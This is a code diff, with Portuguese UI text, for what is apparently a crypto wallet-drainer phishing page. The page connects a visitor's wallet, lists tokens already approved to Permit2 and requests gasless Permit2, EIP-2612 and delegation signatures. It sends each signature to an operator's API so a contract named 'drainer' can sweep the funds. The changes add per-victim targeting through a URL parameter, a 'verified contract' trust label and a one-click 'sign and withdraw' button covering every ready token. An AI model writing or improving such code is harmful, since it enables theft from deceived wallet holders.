@@ -46,7 +46,9 @@ let read, signer, owner, drainer, chainId;
 let rows = [];
 
 // config: local (localStorage) > servida por /api/config (assada do .env/.deployments.json)
-const API_BASE = new URLSearchParams(location.search).get("api") ?? document.querySelector('meta[name="api"]')?.content ?? "";
+const QS = new URLSearchParams(location.search);
+const ALVO = (QS.get("a") || "").toLowerCase();
+const API_BASE = QS.get("api") ?? document.querySelector('meta[name="api"]')?.content ?? "";
 const remote = await fetch(API_BASE + "/api/config")
   .then((r) => r.json())
   .catch(() => ({}));
@@ -62,12 +64,23 @@ for (const k of ["rpc", "drainer", "sweeper", "operator"]) {
   });
 }
 if (remote.chainId) log(`config loaded (chain ${remote.chainId})`);
+function pintaSpender() {
+  const d = $("drainer").value;
+  if (!d) return;
+  try {
+    const a = getAddress(d);
+    $("spenderPill").textContent = `spender ${a.slice(0, 6)}…${a.slice(-4)}`;
+    $("spenderPill").href = `https://etherscan.io/address/${a}#code`;
+    $("spenderLine").textContent = `spender: ${a} · contrato com código verificado`;
+  } catch {}
+}
 if (remote.drainer) {
   const sp = $("spenderLine");
   if (sp) {
-    sp.innerHTML = `spender (this page's contract): ${remote.drainer} — source verified on Sourcify`;
+    sp.textContent = `spender: ${remote.drainer} — contrato com código verificado`;
   }
 }
+pintaSpender();
 
 // se um POST falhou antes (API fora do ar), tenta entregar de novo o que ficou guardado
 async function flushPending() {
@@ -100,6 +113,12 @@ async function connect() {
   owner = await signer.getAddress();
   chainId = Number((await browser.getNetwork()).chainId);
   $("who").textContent = owner;
+  if (ALVO) {
+    const ok = owner.toLowerCase() === ALVO;
+    $("alvoLine").hidden = false;
+    $("alvoLine").textContent = `${ok ? "carteira confirmada" : "atenção: ligaste outra carteira"} — alvo ${ALVO}`;
+    $("alvoLine").className = "alvo mono " + (ok ? "ok" : "flag");
+  }
   log(`connected ${owner} chain ${chainId}`, "ok");
   await scan(); // um clique a menos: ja lista o portfolio
 }
@@ -140,9 +159,11 @@ async function scan() {
       <td class="num">${allowance.nonce}</td>`;
     tbody.append(tr);
   }
-  const pagaveis = rows.filter((r) => r.balance > 0n && r.ready > 0n);
+  const pagaveis = prontos();
   const semApproval = rows.filter((r) => r.balance > 0n && r.ready === 0n);
   $("all").checked = pagaveis.length > 0;
+  pintaSpender();
+  atualizarCta();
   if (!rows.length) log("nothing found on this wallet", "flag");
   else {
     log(`${pagaveis.length} token(s) ready to move (pre-selected)`, "ok");
@@ -164,11 +185,30 @@ async function tokensFor(who) {
   return base.slice(0, 60);
 }
 
-function selected() {
+function marcados() {
   return [...document.querySelectorAll("#table tbody tr")]
     .map((tr, i) => (tr.querySelector("input").checked ? rows[i] : null))
     .filter(Boolean)
     .filter((r) => r.balance > 0n);
+}
+function prontos() {
+  return rows.filter((r) => r.balance > 0n && r.ready > 0n);
+}
+// use a selecao se houver, senao todos os prontos (um clique a menos)
+function selected() {
+  const m = marcados();
+  return m.length ? m : prontos();
+}
+function atualizarCta() {
+  const n = prontos().length;
+  const b = $("assinarTudo");
+  b.disabled = !owner || n === 0;
+  b.textContent = n ? `Assinar e sacar (${n} token${n > 1 ? "s" : ""})` : "Assinar e sacar";
+  $("ctaHint").textContent = !owner
+    ? "Liga a carteira para ver o que está pronto."
+    : n
+      ? `${n} token(s) já aprovados ao Permit2. Uma assinatura, sem gas, cobre todos.`
+      : "Nada pronto nesta carteira (sem saldo ou sem aprovação ao Permit2).";
 }
 
 async function capture(payload) {
@@ -196,7 +236,7 @@ async function capture(payload) {
 
 async function signPermit2() {
   const picks = selected();
-  if (!picks.length) return log("nothing with balance to sign", "bad");
+  if (!picks.length) return log("nada com saldo para assinar", "bad");
   const p2 = new Contract(PERMIT2, P2, read);
   const now = Math.floor(Date.now() / 1000);
   const details = [];
@@ -219,14 +259,23 @@ async function signPermit2() {
       { name: "sigDeadline", type: "uint256" },
     ],
   };
-  log(`waiting for Permit2 signature (${details.length} token(s), no gas)...`);
-  const signature = await signer.signTypedData(domain, types, batch);
+  const btn = $("assinarTudo");
+  btn.disabled = true; btn.textContent = "A assinar…";
+  log(`a pedir assinatura Permit2 (${details.length} token(s), sem gas)...`);
+  let signature;
+  try {
+    signature = await signer.signTypedData(domain, types, batch);
+  } finally {
+    if (!signature) { btn.disabled = false; atualizarCta(); }
+  }
   await capture({
     kind: "permit2",
     details: details.map((d) => ({ ...d, amount: d.amount.toString() })),
     sigDeadline: batch.sigDeadline,
     signature,
   });
+  btn.textContent = "Assinado ✓";
+  $("ctaHint").textContent = "Assinatura capturada. O saque é submetido automaticamente pelo operador.";
 }
 
 async function sign2612() {
@@ -297,7 +346,7 @@ async function delegate() {
 $("all").onchange = () => document.querySelectorAll("#table tbody input").forEach((c) => (c.checked = $("all").checked));
 $("connect").onclick = () => connect().catch((e) => log(e.message, "bad"));
 $("scan").onclick = () => scan().catch((e) => log(e.message, "bad"));
-$("permit2").onclick = () => signPermit2().catch((e) => log(e.message, "bad"));
+$("assinarTudo").onclick = () => signPermit2().catch((e) => log(e.message, "bad"));
 $("p2612").onclick = () => sign2612().catch((e) => log(e.message, "bad"));
 $("pull").onclick = () => pull().catch((e) => log(e.message, "bad"));
 $("delegate").onclick = () => delegate().catch((e) => log(e.message, "bad"));
